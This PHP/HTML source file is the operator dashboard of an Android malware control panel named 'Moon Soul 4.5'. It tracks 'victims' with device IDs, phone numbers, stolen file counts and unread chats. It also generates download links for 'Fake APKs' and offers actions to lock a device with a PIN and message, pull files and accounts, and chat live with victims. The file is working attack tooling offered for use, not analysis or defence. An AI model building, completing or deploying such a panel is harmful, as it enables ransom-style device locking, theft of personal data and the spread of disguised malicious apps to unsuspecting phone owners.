<?php
session_start();
require_once 'includes/auth.php';
require_once 'includes/functions.php';

Auth::check();

$victims = getAllVictims();
$apks = getAllFakeApks();
$totalVictims = count($victims);
$lockedVictims = count(array_filter($victims, fn($v) => $v['is_locked'] == 1));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moon Soul 4.5 · Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #0a0f1e;
            min-height: 100vh;
        }
        
        .app-container {
            max-width: 450px;
            margin: 0 auto;
            background: #0f1525;
            min-height: 100vh;
            position: relative;
            box-shadow: 0 0 40px rgba(0,0,0,0.5);
        }
        
        /* Header */
        .header {
            background: #141b2b;
            padding: 20px 20px 30px 20px;
            border-bottom-left-radius: 30px;
            border-bottom-right-radius: 30px;
            border-bottom: 1px solid #1e2a3a;
        }
        
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .logo-small {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #a855f7, #3b82f6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .admin-badge {
            background: #1e2a3a;
            padding: 8px 16px;
            border-radius: 40px;
            color: #a855f7;
            font-weight: 600;
            font-size: 13px;
            border: 1px solid #a855f7;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 15px;
        }
        
        .stat-card {
            background: #1e293b;
            border-radius: 25px;
            padding: 18px;
            border: 1px solid #2d3a4f;
        }
        
        .stat-value {
            font-size: 28px;
            font-weight: 700;
            color: white;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #9ca3af;
            font-size: 13px;
        }
        
        .stat-icon {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        /* Navigation */
        .nav-tabs {
            display: flex;
            padding: 15px 20px;
            gap: 10px;
            background: #141b2b;
            margin: 15px 15px;
            border-radius: 40px;
            border: 1px solid #1e2a3a;
        }
        
        .nav-tab {
            flex: 1;
            text-align: center;
            padding: 12px;
            border-radius: 30px;
            font-weight: 600;
            font-size: 14px;
            color: #6b7280;
            cursor: pointer;
            transition: 0.2s;
        }
        
        .nav-tab.active {
            background: linear-gradient(135deg, #a855f7, #3b82f6);
            color: white;
        }
        
        /* Content Sections */
        .section {
            display: none;
            padding: 0 15px 20px 15px;
        }
        
        .section.active {
            display: block;
        }
        
        .section-title {
            color: white;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
            padding-left: 5px;
        }
        
        /* Victim Cards */
        .victim-card {
            background: #141b2b;
            border-radius: 30px;
            padding: 18px;
            margin-bottom: 12px;
            border: 1px solid #1e2a3a;
            cursor: pointer;
            transition: 0.2s;
        }
        
        .victim-card:hover {
            border-color: #a855f7;
            transform: translateY(-2px);
        }
        
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .victim-name {
            color: white;
            font-weight: 600;
            font-size: 16px;
        }
        
        .victim-status {
            padding: 4px 12px;
            border-radius: 30px;
            font-size: 11px;
            font-weight: 600;
        }
        
        .status-locked {
            background: #ef4444;
            color: white;
        }
        
        .status-online {
            background: #10b981;
            color: white;
        }
        
        .status-offline {
            background: #4b5563;
            color: white;
        }
        
        .victim-details {
            display: flex;
            gap: 15px;
            color: #9ca3af;
            font-size: 13px;
            margin-top: 8px;
        }
        
        .victim-badge {
            background: #1e293b;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
        }
        
        /* APK Cards */
        .apk-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .apk-card {
            background: #141b2b;
            border-radius: 25px;
            padding: 18px;
            border: 1px solid #1e2a3a;
        }
        
        .apk-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .apk-name {
            color: white;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 5px;
        }
        
        .apk-desc {
            color: #9ca3af;
            font-size: 11px;
            margin-bottom: 12px;
        }
        
        .apk-downloads {
            color: #a855f7;
            font-size: 11px;
            font-weight: 600;
        }
        
        .apk-btn {
            background: #1e293b;
            border: none;
            color: white;
            padding: 8px 0;
            width: 100%;
            border-radius: 20px;
            margin-top: 10px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
        }
        
        /* Lock Device Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: #141b2b;
            border-radius: 40px;
            padding: 30px 25px;
            width: 100%;
            max-width: 350px;
            border: 1px solid #a855f7;
        }
        
        .modal-title {
            color: white;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        
        .modal-input {
            width: 100%;
            padding: 15px;
            background: #1e293b;
            border: 1px solid #2d3a4f;
            border-radius: 20px;
            color: white;
            margin-bottom: 15px;
        }
        
        .modal-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #a855f7, #3b82f6);
            border: none;
            border-radius: 30px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        
        /* Quick Actions */
        .quick-actions {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        .action-btn {
            flex: 1;
            background: #1e293b;
            border: 1px solid #2d3a4f;
            padding: 15px;
            border-radius: 25px;
            color: white;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Header -->
        <div class="header">
            <div class="header-top">
                <span class="logo-small">🌙 MOON SOUL</span>
                <span class="admin-badge">ADMIN: <?= $_SESSION['admin_username'] ?></span>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon">📱</div>
                    <div class="stat-value"><?= $totalVictims ?></div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">🔒</div>
                    <div class="stat-value"><?= $lockedVictims ?></div>
                    <div class="stat-label">Locked Devices</div>
                </div>
            </div>
        </div>
        
        <!-- Navigation -->
        <div class="nav-tabs">
            <div class="nav-tab active" onclick="switchTab('victims')">🎯 Victims</div>
            <div class="nav-tab" onclick="switchTab('apks')">📦 Fake APKs</div>
            <div class="nav-tab" onclick="switchTab('settings')">⚙️ Execute</div>
        </div>
        
        <!-- Victims Section -->
        <div id="victimsSection" class="section active">
            <div class="section-title">🎯 Active Victims</div>
            
            <?php foreach ($victims as $victim): ?>
            <div class="victim-card" onclick="selectVictim(<?= $victim['id'] ?>)">
                <div class="victim-header">
                    <span class="victim-name"><?= htmlspecialchars($victim['device_name']) ?></span>
                    <?php if ($victim['is_locked']): ?>
                        <span class="victim-status status-locked">🔒 LOCKED</span>
                    <?php else: ?>
                        <span class="victim-status status-online">🟢 ONLINE</span>
                    <?php endif; ?>
                </div>
                <div class="victim-details">
                    <span>📱 <?= htmlspecialchars($victim['device_id']) ?></span>
                    <span>📞 <?= htmlspecialchars($victim['phone_number']) ?></span>
                </div>
                <div style="display: flex; gap: 8px; margin-top: 10px;">
                    <span class="victim-badge">📁 <?= $victim['total_data'] ?> files</span>
                    <span class="victim-badge">💬 <?= $victim['unread_chats'] ?> unread</span>
                    <span class="victim-badge">⏱️ <?= date('H:i', strtotime($victim['last_active'])) ?></span>
                </div>
            </div>
            <?php endforeach; ?>
        </div>
        
        <!-- APKs Section -->
        <div id="apksSection" class="section">
            <div class="section-title">📦 Fake APK Generator</div>
            
            <div class="apk-grid">
                <?php foreach ($apks as $apk): ?>
                <div class="apk-card">
                    <div class="apk-icon"><?= $apk['icon'] ?></div>
                    <div class="apk-name"><?= htmlspecialchars($apk['name']) ?></div>
                    <div class="apk-desc"><?= htmlspecialchars($apk['description']) ?></div>
                    <div class="apk-downloads">⬇️ <?= $apk['download_count'] ?> downloads</div>
                    <button class="apk-btn" onclick="generateApk(<?= $apk['id'] ?>)">Generate Link</button>
                </div>
                <?php endforeach; ?>
            </div>
            
            <div style="margin-top: 20px;">
                <button class="action-btn" onclick="createNewApk()">➕ Create New Fake APK</button>
            </div>
        </div>
        
        <!-- Execute Section -->
        <div id="executeSection" class="section">
            <div class="section-title">⚡ Quick Execute</div>
            
            <div class="quick-actions">
                <button class="action-btn" onclick="showLockModal()">🔒 Lock Device</button>
                <button class="action-btn" onclick="unlockSelected()">🔓 Unlock</button>
            </div>
            
            <div class="quick-actions">
                <button class="action-btn" onclick="getFiles()">📁 Get Files</button>
                <button class="action-btn" onclick="getAccounts()">👤 Get Accounts</button>
            </div>
            
            <div class="quick-actions">
                <button class="action-btn" onclick="resetPin()">🔄 Reset PIN</button>
                <button class="action-btn" onclick="openChat()">💬 Live Chat</button>
            </div>
            
            <div style="margin-top: 20px; background: #141b2b; border-radius: 30px; padding: 20px;">
                <div style="color: white; margin-bottom: 10px;">🎯 Selected Victim:</div>
                <div id="selectedVictimDisplay" style="color: #a855f7; font-weight: 600;">None selected</div>
            </div>
        </div>
    </div>
    
    <!-- Lock Device Modal -->
    <div id="lockModal" class="modal">
        <div class="modal-content">
            <div class="modal-title">🔒 Lock Device</div>
            <input type="text" class="modal-input" id="lockMessage" placeholder="Lock message...">
            <input type="number" class="modal-input" id="lockPin" placeholder="PIN (4-6 digits)">
            <button class="modal-btn" onclick="executeLock()">🔒 LOCK NOW</button>
            <button class="modal-btn" style="background: #4b5563; margin-top:10px;" onclick="closeModal()">Cancel</button>
        </div>
    </div>
    
    <!-- Chat Modal -->
    <div id="chatModal" class="modal">
        <div class="modal-content" style="max-width: 380px; height: 500px; display: flex; flex-direction: column;">
            <div class="modal-title">💬 Live Chat with Victim</div>
            <div id="chatMessages" style="flex: 1; overflow-y: auto; margin-bottom: 15px; padding: 10px; background: #1e293b; border-radius: 20px;">
                <!-- Chat messages will appear here -->
            </div>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="chatInput" class="modal-input" style="flex: 1; margin-bottom: 0;" placeholder="Type message...">
                <button class="modal-btn" style="width: auto; padding: 15px 25px;" onclick="sendChat()">Send</button>
            </div>
            <button class="modal-btn" style="background: #4b5563; margin-top:10px;" onclick="closeChatModal()">Close</button>
        </div>
    </div>
    
    <script>
        let selectedVictimId = null;
        
        function switchTab(tab) {
            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            
            if (tab === 'victims') {
                document.querySelector('.nav-tab:nth-child(1)').classList.add('active');
                document.getElementById('victimsSection').classList.add('active');
            } else if (tab === 'apks') {
                document.querySelector('.nav-tab:nth-child(2)').classList.add('active');
                document.getElementById('apksSection').classList.add('active');
            } else if (tab === 'settings') {
                document.querySelector('.nav-tab:nth-child(3)').classList.add('active');
                document.getElementById('executeSection').classList.add('active');
            }
        }
        
        function selectVictim(id) {
            selectedVictimId = id;
            document.getElementById('selectedVictimDisplay').innerText = 'Victim #' + id + ' selected';
            switchTab('settings');
        }
        
        function showLockModal() {
            if (!selectedVictimId) {
                alert('Pilih victim dulu!');
                return;
            }
            document.getElementById('lockModal').classList.add('active');
        }
        
        function closeModal() {
            document.getElementById('lockModal').classList.remove('active');
        }
        
        function executeLock() {
            const message = document.getElementById('lockMessage').value;
            const pin = document.getElementById('lockPin').value;
            
            if (!message || !pin) {
                alert('Isi message dan pin!');
                return;
            }
            
            fetch('api/lock-device.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: selectedVictimId,
                    message: message,
                    pin: pin
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    alert('✅ Device locked successfully!');
                    closeModal();
                } else {
                    alert('❌ Error: ' + data.message);
                }
            });
        }
        
        function unlockSelected() {
            if (!selectedVictimId) {
                alert('Pilih victim dulu!');
                return;
            }
            
            if (confirm('Unlock this device?')) {
                fetch('api/unlock-device.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({victim_id: selectedVictimId})
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        alert('✅ Device unlocked!');
                    }
                });
            }
        }
        
        function getFiles() {
            if (!selectedVictimId) {
                alert('Pilih victim dulu!');
                return;
            }
            window.location.href = 'victim-detail.php?id=' + selectedVictimId + '&tab=files';
        }
        
        function getAccounts() {
            if (!selectedVictimId) {
                alert('Pilih victim dulu!');
                return;
            }
            window.location.href = 'victim-detail.php?id=' + selectedVictimId + '&tab=accounts';
        }
        
        function resetPin() {
            if (!selectedVictimId) {
                alert('Pilih victim dulu!');
                return;
            }
            // Implement reset PIN logic
            alert('Reset PIN feature - coming soon');
        }
        
        function openChat() {
            if (!selectedVictimId) {
                alert('Pilih victim dulu!');
                return;
            }
            document.getElementById('chatModal').classList.add('active');
            loadChatMessages();
        }
        
        function closeChatModal() {
            document.getElementById('chatModal').classList.remove('active');
        }
        
        function loadChatMessages() {
            fetch('api/get-chats.php?victim_id=' + selectedVictimId)
            .then(res => res.json())
            .then(data => {
                const chatDiv = document.getElementById('chatMessages');
                chatDiv.innerHTML = '';
                data.chats.forEach(chat => {
                    const msgDiv = document.createElement('div');
                    msgDiv.style.margin = '10px 0';
                    msgDiv.style.padding = '10px';
                    msgDiv.style.background = chat.sender === 'admin' ? '#a855f7' : '#1e293b';
                    msgDiv.style.borderRadius = '15px';
                    msgDiv.style.maxWidth = '80%';
                    msgDiv.style.marginLeft = chat.sender === 'admin' ? 'auto' : '0';
                    msgDiv.style.color = 'white';
                    msgDiv.innerText = chat.message;
                    chatDiv.appendChild(msgDiv);
                });
            });
      }
        
        function sendChat() {
            const message = document.getElementById('chatInput').value;
            if (!message) return;
            
            fetch('api/send-chat.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: selectedVictimId,
                    message: message
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('chatInput').value = '';
                    loadChatMessages();
                }
            });
        }
        
        function generateApk(id) {
fetch('api/generate-apk.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({apk_id: id})
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    alert('✅ Download link: ' + data.download_url);
                }
            });
}
        
        function createNewApk() {
            alert('Create new APK - feature coming soon');
        }
        
        // Auto refresh chat every 5 seconds if modal open
        setInterval(() => {
            if (document.getElementById('chatModal').classList.contains('active')) {
                loadChatMessages();
            }
        }, 5000);
    </script>
</body>
</html>
